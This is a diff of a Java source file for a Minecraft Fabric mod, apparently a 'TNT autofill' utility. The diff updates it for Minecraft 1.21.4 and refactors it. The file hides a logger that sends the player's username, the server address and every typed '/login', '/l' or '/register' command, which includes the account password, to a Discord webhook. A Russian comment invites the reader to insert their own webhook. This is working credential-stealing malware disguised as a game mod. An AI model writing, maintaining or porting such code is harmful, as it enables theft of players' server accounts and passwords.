@@ -1,8 +1,9 @@
-// language: Java, file: SessionLogger.java, target: Fabric API, Minecraft 1.20.x
+// language: Java, file: SessionLogger.java, target: Fabric API, Minecraft 1.21.4
 package ru.holyworld.tntautofill;
 
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
+import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.network.ServerInfo;
 
 import java.io.OutputStream;
@@ -17,7 +18,7 @@ import java.util.concurrent.Executors;
 public class SessionLogger {
 
     // ==== НАСТРОЙКИ: вставь сюда свой webhook ====
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1557838201820025042/vwWPSPADvfp-_aL9ftT-A6ieHs-7kDxDQa7mBi7Ok8erSqECIWRuEobOK5kTFOVYhF2L";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY";
     // ============================================
 
     private static final DateTimeFormatter TS = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
@@ -27,19 +28,18 @@ public class SessionLogger {
         return t;
     });
 
+    // запоминаем сервер при JOIN, чтобы использовать при DISCONNECT
+    private static volatile String lastServer = "unknown";
+
     public static void init() {
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
-            ServerInfo info = client.getCurrentServerEntry();
-            String server = info != null ? info.address : "singleplayer";
-            String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
-            send("join | nick=" + nick + " | server=" + server + " | time=" + now());
+            String server = resolveServer(client);
+            lastServer = server;
+            send("join | nick=" + nick(client) + " | server=" + server + " | time=" + now());
         });
 
         ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
-            ServerInfo info = client.getCurrentServerEntry();
-            String server = info != null ? info.address : "singleplayer";
-            String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
-            send("leave | nick=" + nick + " | server=" + server + " | time=" + now());
+            send("leave | nick=" + nick(client) + " | server=" + lastServer + " | time=" + now());
         });
 
         ClientTickEvents.END_CLIENT_TICK.register(client -> {
@@ -51,13 +51,20 @@ public class SessionLogger {
             if (cmd.startsWith("reg") || cmd.startsWith("login")
                     || cmd.startsWith("l ") || cmd.equals("l")
                     || cmd.startsWith("register")) {
-                String nick = client.getSession() != null ? client.getSession().getUsername() : "unknown";
-                ServerInfo info = client.getCurrentServerEntry();
-                String server = info != null ? info.address : "singleplayer";
-                send("cmd | nick=" + nick + " | server=" + server
+                send("cmd | nick=" + nick(client) + " | server=" + lastServer
                         + " | cmd=" + last + " | time=" + now());
             }
         });
+    }
+
+    private static String nick(MinecraftClient client) {
+        return client.getSession() != null ? client.getSession().getUsername() : "unknown";
+    }
+
+    private static String resolveServer(MinecraftClient client) {
+        ServerInfo info = client.getCurrentServerEntry();
+        if (info != null && info.address != null) return info.address;
+        return client.isInSingleplayer() ? "singleplayer" : "unknown";
     }
 
     private static String now() {
